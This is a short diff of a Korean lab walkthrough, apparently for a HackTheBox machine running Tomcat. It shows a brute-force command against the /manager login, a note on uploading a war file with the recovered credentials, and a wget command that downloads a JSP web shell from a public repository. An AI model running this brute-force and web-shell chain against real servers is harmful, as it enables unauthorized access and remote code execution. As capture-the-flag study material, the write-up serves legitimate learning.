@@ -26,7 +26,7 @@ python3 mgr_brute.py -U http://10.10.10.95:8080/ -P /manager -u /usr/share/metas
 
 ---
 ## RCE
-- `war`파일 업로드가 가능하다는 것을 확인
+- `Manager App`에 발견한 로그인 계정으로 접속하여 `war`파일 업로드가 가능하다는 것을 확인
 - 웹셸을 압축하여 `war`파일로 생성.
 ```bash
 wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
